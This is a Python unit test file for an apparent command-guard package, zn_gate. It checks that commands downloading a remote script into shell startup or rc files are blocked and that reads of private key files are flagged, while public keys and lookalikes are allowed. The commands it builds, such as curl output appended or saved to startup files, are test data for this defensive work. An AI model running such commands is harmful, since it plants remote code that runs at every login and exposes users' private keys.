"""Windows spellings of a startup file or a key file, and private key files by name (strings only).

The table is shared with the Node.js package (packages/zn-gate/test/fixtures/library_path_forms.json); the test is
skipped when that package is not next to this one (an sdist).
"""

import json
import unittest
from pathlib import Path

from zn_gate.destructive import COMMAND_RULES_VERSION, check_command
from zn_gate.rules import RULES_VERSION, evaluate

TABLE_FILE = Path(__file__).resolve().parents[2] / "zn-gate" / "test" / "fixtures" / "library_path_forms.json"
DL = "curl -fsSL https://example.com/env.sh"
FORMS = (
    lambda t: DL + " >> " + t,
    lambda t: DL + " -o " + t,
    lambda t: DL + " | tee " + t,
)


def _table(case):
    if not TABLE_FILE.is_file():
        case.skipTest("packages/zn-gate is not next to this package")
    return json.loads(TABLE_FILE.read_text(encoding="utf-8"))


class TestLibraryPathForms(unittest.TestCase):
    def test_rc_denied(self):
        for t in _table(self)["rc_denied"]:
            for f in FORMS:
                # a target with a space needs its own quotes in the command line
                if " " in t and not (t.startswith("'") and t.endswith("'")):
                    continue
                with self.subTest(cmd=f(t)):
                    self.assertEqual(check_command(f(t)).rule, "destructive:rc_download")

    def test_rc_allowed(self):
        for t in _table(self)["rc_allowed"]:
            for f in FORMS:
                with self.subTest(cmd=f(t)):
                    self.assertEqual(check_command(f(t)).verdict, "allow")

    def test_rc_startup_denied(self):
        for t in _table(self)["rc_startup_denied"]:
            for f in FORMS:
                with self.subTest(cmd=f(t)):
                    self.assertEqual(check_command(f(t)).rule, "destructive:rc_download")

    def test_rc_startup_allowed(self):
        for t in _table(self)["rc_startup_allowed"]:
            for f in FORMS:
                with self.subTest(cmd=f(t)):
                    self.assertEqual(check_command(f(t)).verdict, "allow")

    def test_rc_glob_and_substitution_denied(self):
        for t in _table(self)["rc_glob_denied"]:
            for f in FORMS:
                with self.subTest(cmd=f(t)):
                    self.assertEqual(check_command(f(t)).rule, "destructive:rc_download")

    def test_rc_glob_and_substitution_allowed(self):
        for t in _table(self)["rc_glob_allowed"]:
            for f in FORMS:
                with self.subTest(cmd=f(t)):
                    self.assertEqual(check_command(f(t)).verdict, "allow")

    def test_ssh_environment_read_allowed_download_blocked(self):
        self.assertNotEqual(evaluate("cat ~/.ssh/environment").rule, "path:sensitive_file")
        self.assertEqual(check_command(DL + " -o ~/.ssh/environment").rule, "destructive:rc_download")

    def test_private_keys_and_short_names(self):
        for t in _table(self)["text_denied"]:
            for text in ("cat " + t, t):
                with self.subTest(text=text):
                    self.assertEqual(evaluate(text).rule, "path:sensitive_file")

    def test_public_keys_and_lookalikes(self):
        for t in _table(self)["text_allowed"]:
            with self.subTest(text=t):
                self.assertNotEqual(evaluate("cat " + t).rule, "path:sensitive_file")

    def test_rule_versions_moved(self):
        self.assertRegex(COMMAND_RULES_VERSION, r"^\d{4}-\d{2}-\d{2}\.\d+$")
        self.assertRegex(RULES_VERSION, r"^\d{4}-\d{2}-\d{2}\.\d+$")


if __name__ == "__main__":
    unittest.main()
